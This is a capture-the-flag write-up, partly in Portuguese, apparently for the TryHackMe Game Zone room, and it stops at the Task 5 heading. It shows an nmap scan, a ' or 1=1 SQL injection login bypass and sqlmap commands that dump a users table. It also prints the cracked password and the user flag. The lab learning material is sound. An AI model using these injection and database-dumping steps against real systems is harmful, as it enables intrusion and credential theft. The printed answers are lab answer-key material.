# gamezone

TASK 1 - Deploy the vulnerable machine

What is the name of the large cartoon avatar holding a sniper on the forum?
R: Agent 47

nmap -sC -sV 10.10.138.171

![image](https://github.com/yanfernandess/gamezone/assets/100174458/ff14a15b-5083-4c7b-8477-422c389aa6c0)

TASK 2 -  Obtain access via SQLi

Log in: ' or 1=1 -- -
Password:

![image](https://github.com/yanfernandess/gamezone/assets/100174458/9b1ab06e-9f2f-4498-b9aa-2e0fca682d61)

When you've logged in, what page do you get redirected to?
R: portal.php

![image](https://github.com/yanfernandess/gamezone/assets/100174458/86b0560e-c2a6-4d29-b7dc-dd067d5c1232)

TASK 3 - Using SQLMap

Salvar o código fonte que aparece no BURP SUITE da página logo após inserir alguma informação no input em um arquivo txt, vamos usar isso logo em seguida.

sqlmap -r request.txt --current-db
![image](https://github.com/yanfernandess/gamezone/assets/100174458/e0590bd6-1677-4274-a095-f79b125ed9f7)

Descobrimos que temos um banco de dados chamado 'db'

sqlmap -r request.txt -D db --tables

![image](https://github.com/yanfernandess/gamezone/assets/100174458/10fe000e-346e-499d-96f2-3b2ab7c228ec)

Temos duas tabelas dentro do banco de dados, vamos explorar elas.

sqlmap -r request.txt -D db users --dump

![image](https://github.com/yanfernandess/gamezone/assets/100174458/27c46287-82b9-4cde-96aa-4c7ec7ee35f5)

In the users table, what is the hashed password?
R: ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14

What was the username associated with the hashed password?
R: agent47

What was the other table name?
R: post

TASK 4 - Cracking a password with JohnTheRipper

Ele esta pedindo para descriptografar com o JohnTheRipper mas utilizei uma ferramenta online para fazer isso, segue o link abaixo:

https://www.dcode.fr/

![image](https://github.com/yanfernandess/gamezone/assets/100174458/614ba3fd-7c28-42e6-a352-660754da9719)

Conseguimos acesso SSH com o login e a senha que acabamos de descriptografar.

![image](https://github.com/yanfernandess/gamezone/assets/100174458/09cf8537-da10-4d64-9c79-20b52316b187)

E conseguimos a primeira flag.

What is the de-hashed password?
R: videogamer124


Now you have a password and username. Try SSH'ing onto the machine.

What is the user flag?
R: 649ac17b1480ac13ef1e4fa579dac95c

TASK 5 - Exposing services with reverse SSH tunnels


